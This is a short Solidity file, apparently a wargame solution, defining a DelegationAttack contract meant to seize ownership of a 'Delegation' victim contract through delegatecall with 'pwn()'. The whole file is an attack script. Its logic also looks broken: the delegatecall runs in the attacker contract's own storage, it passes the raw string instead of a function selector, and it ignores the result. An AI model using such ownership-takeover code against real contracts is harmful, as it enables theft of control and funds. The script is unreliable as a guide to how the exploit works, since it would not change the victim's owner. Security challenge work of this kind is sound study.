pragma solidity ^0.8.11;

import "./Delegation.sol";

contract DelegationAttack {
    Delegation private _victim;

    constructor(address payable victim) {
        _victim = Delegation(victim);
    }

    function attack() external returns (address) {
        (bool success, ) = address(_victim).delegatecall("pwn()");

        return _victim.owner();
    }
}
